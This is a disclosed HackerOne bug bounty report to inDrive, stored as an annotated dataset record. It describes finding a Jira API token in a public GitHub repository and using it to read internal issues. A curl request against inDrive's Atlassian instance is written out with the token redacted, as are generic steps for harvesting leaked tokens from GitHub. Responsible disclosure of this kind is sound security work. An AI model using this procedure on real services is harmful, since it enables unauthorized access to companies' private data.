{
  "reported_to": "inDrive",
  "reported_by": "bogdantcaciuc ",
  "title": "Full access to InDrive jira panel via exposed API token ",
  "content": "\nDescription\nHello!\nBrowsing through GitHub I found the following repository:\n\u2588\u2588\u2588\nLooking for interesting keywords, the following file popped up:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCode 225 Bytes\n1package ru.indriver.jira.api\n2\n3object Constants {\n4    const val jiraHost = \"https://indriver.atlassian.net\"\n5    const val baseUrl = \"$jiraHost/rest\"\n6    const val token = \"\u2588\u2588\u2588\u2588\u2588\u2588\"\n7\n8    \u2588\u2588\u2588\n9    // const val token = \"\u2588\u2588\u2588\u2588\u2588\u2588==\"\n10}\nThe repository wasn't updated in a while, but I still decided to give it a change and try to make an API call with the auth token:\ncurl -i -s -k -X $'GET' \\\n-H $'Host: indriver.atlassian.net' -H $'Cache-Control: max-age=0' -H $'Authorization: Basic \u2588\u2588\u2588\u2588' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"107\\\", \\\"Chromium\\\";v=\\\"107\\\", \\\"Not=A?Brand\\\";v=\\\"24\\\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \\\"macOS\\\"' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,de;q=0.7' \\\n-b $'atlassian.xsrf.token=450f5681-becb-48d1-a8bc-efc045d75244_08e86700250ae917acc90fead0122eca3628f5a5_lout' \\\n$'https://indriver.atlassian.net/rest/api/2/issue/67212'\nSurprisingly, this was sucessfull and I was able to fetch a random issue ID, which normally I wouldn't have access to because you're instantly getting redirect to the atlassian OAuth flow if you're visiting https://indriver.atlassian.net/\nSteps to reproduce:\nDo the following cURL:\nCode 1.01 KiB\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: indriver.atlassian.net' -H $'Cache-Control: max-age=0' -H $'Authorization: Basic \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' -H $'Content-Type: application/json' -H $'Sec-Ch-Ua: \\\"Google Chrome\\\";v=\\\"107\\\", \\\"Chromium\\\";v=\\\"107\\\", \\\"Not=A?Brand\\\";v=\\\"24\\\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \\\"macOS\\\"' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,de;q=0.7' \\\n3    -b $'atlassian.xsrf.token=450f5681-becb-48d1-a8bc-efc045d75244_08e86700250ae917acc90fead0122eca3628f5a5_lout' \\\n4    $'https://indriver.atlassian.net/rest/api/2/issue/67212'\nNotice the response:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nWe have full access to the InDrive Atlassian panel, ability to fetch sensitive information.\nImpact\nSensitive information disclosure - full access to the Atlassian panel - projects/issues/accounts etc.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Information Disclosure"
  ],
  "screenshots": {},
  "disclosed_date": 1687958460,
  "report_url": "https://hackerone.com/reports/1785145",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Search GitHub for repositories related to InDrive and look for exposed API tokens in the code."
    ],
    [
      2,
      "Use the found token to make an unauthenticated API call to InDrive's Jira panel to fetch sensitive information."
    ]
  ],
  "vuln_description": "The vulnerability involves the exposure of an API token in a public GitHub repository, which allows unauthorized access to InDrive's Jira panel. This token bypasses the normal authentication flow, granting full access to sensitive information such as projects, issues, and accounts.",
  "reason": "The attack is straightforward once the token is discovered in the public repository. It does not involve complex interactions or manipulations of application states, nor does it require novel logic. The primary challenge is finding the token, which was publicly accessible.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}